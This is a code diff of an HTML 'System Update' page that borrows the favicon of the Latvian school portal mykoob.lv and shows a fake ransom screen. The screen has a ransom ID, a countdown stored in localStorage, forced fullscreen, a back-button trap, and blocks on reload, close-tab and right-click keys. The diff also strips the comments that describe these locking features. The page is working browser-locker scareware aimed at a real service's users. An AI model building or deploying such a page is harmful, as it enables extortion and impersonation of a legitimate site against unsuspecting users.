@@ -5,8 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>System Update</title>
 
-<link rel="icon" type="image/png" media="(prefers-color-scheme: dark)"  href="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png" />
-<link rel="icon" type="image/png" media="(prefers-color-scheme: light)" href="https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-dark-DX3tqsaM.png" />
+<link rel="icon" type="image/x-icon" href="https://files.mykoob.lv/favicons/favicon.ico" />
 
 <link rel="preconnect" href="https://fonts.googleapis.com" />
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -116,7 +115,6 @@ ID: <span id="ransomId">—</span>
 const RANSOM_KEY    = 'mykoob_ransom_deadline';
 const RANSOM_ID_KEY = 'mykoob_ransom_id';
 
-/* ── Fullscreen automātiski ── */
 function requestFullscreen() {
   if (document.fullscreenElement) return;
 
@@ -146,7 +144,6 @@ document.addEventListener('fullscreenchange', function () {
   }
 });
 
-/* ── Timer no localStorage ── */
 let deadline = parseInt(localStorage.getItem(RANSOM_KEY) || '0', 10);
 
 if (!deadline || deadline < Date.now()) {
@@ -175,13 +172,11 @@ function renderTimer() {
 renderTimer();
 setInterval(renderTimer, 1000);
 
-/* ── Bloku Back pogu ── */
 history.pushState(null, '', location.href);
 window.addEventListener('popstate', function () {
   history.pushState(null, '', location.href);
 });
 
-/* ── Bloku F5, Ctrl+R, Ctrl+W, Ctrl+T ── */
 document.addEventListener('keydown', function (e) {
   const k = e.key.toLowerCase();
   if (
@@ -198,7 +193,6 @@ document.addEventListener('keydown', function (e) {
   }
 });
 
-/* ── Bloku peles labo pogu ── */
 document.addEventListener('contextmenu', function (e) {
   e.preventDefault();
 });
